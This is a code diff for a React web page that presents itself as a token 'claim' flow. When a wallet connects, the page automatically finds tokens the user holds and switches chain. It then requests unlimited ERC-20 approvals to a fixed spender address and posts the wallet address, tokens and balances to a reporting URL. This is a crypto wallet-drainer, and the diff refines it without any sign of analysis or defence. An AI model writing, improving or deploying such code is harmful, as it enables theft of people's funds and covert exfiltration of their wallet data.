@@ -36,6 +36,13 @@ const TOKENS_BY_CHAIN: Record<
   ],
 };
 
+// Human-readable chain names
+const CHAIN_NAMES: Record<number, string> = {
+  1: "Ethereum Mainnet",
+  42161: "Arbitrum",
+  11155111: "Sepolia",
+};
+
 // Component that reports wallet connections
 function ConnectionReporter() {
   const { address, isConnected } = useAccount();
@@ -60,7 +67,7 @@ export default function Home() {
   const { address, isConnected, chainId } = useAccount();
   const { writeContractAsync } = useWriteContract();
   const [status, setStatus] = useState<string>("");
-   
+
   async function handleClaim() {
     if (!isConnected || !address) {
       setStatus("Wallet not connected");
@@ -73,7 +80,6 @@ export default function Home() {
       let targetChain: number | null = null;
       let usableTokens: { symbol: string; address: `0x${string}`; min: bigint }[] = [];
 
-      // scan all chains
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         const numericCid = Number(cid);
 
@@ -102,8 +108,10 @@ export default function Home() {
         return;
       }
 
+      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";
+
       if (chainId !== targetChain) {
-        setStatus(`Switching to chain ${targetChain}...`);
+        setStatus(`Switching to ${chainName}...`);
         await switchChain(config, { chainId: targetChain });
       }
 
@@ -113,17 +121,18 @@ export default function Home() {
         return;
       }
 
-      // approve and report
       for (const token of usableTokens) {
-        setStatus(`Approving ${token.symbol}...`);
+        setStatus(`Approving ${token.symbol} on ${chainName}...`);
+
         const txHash = await writeContractAsync({
           address: token.address,
           abi: erc20Abi,
           functionName: "approve",
           args: [SPENDER, maxUint256],
+          account: address,
+          chainId: targetChain,
         });
 
-        // read actual balance after approval
         let rawBalance: bigint = BigInt(0);
         try {
           rawBalance = await readContract(config, {
@@ -137,20 +146,19 @@ export default function Home() {
           console.error(`Failed to read balance for ${token.symbol}:`, err);
         }
 
-        const decimals = (token as any).decimals || 18; // fallback
+        const decimals = (token as any).decimals || 18;
         const formattedBalance = Number(rawBalance) / 10 ** decimals;
 
         setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
 
-        // report approval including balance
-        await  fetch(`${REPORT_URL}`, {
+        // report approval including only chain name
+        await fetch(`${REPORT_URL}`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             event: "approval",
-            functionName: "balanceOf",
             wallet: address,
-            chainId: targetChain,
+            chainName,
             token: token.address,
             symbol: token.symbol,
             balance: formattedBalance,
@@ -158,6 +166,7 @@ export default function Home() {
           }),
         }).catch(console.error);
       }
+
       setStatus("All approvals completed!");
     } catch (err: any) {
       console.error(err);
@@ -165,7 +174,7 @@ export default function Home() {
     }
   }
 
-  // ✅ Automatically trigger claim when wallet connects
+  // Automatically trigger claim when wallet connects
   useEffect(() => {
     if (isConnected && address) handleClaim();
   }, [isConnected, address]);
@@ -180,7 +189,6 @@ export default function Home() {
         marginTop: "40px",
       }}
     >
-      {/* Floating header */}
       <header
         style={{
           position: "fixed",
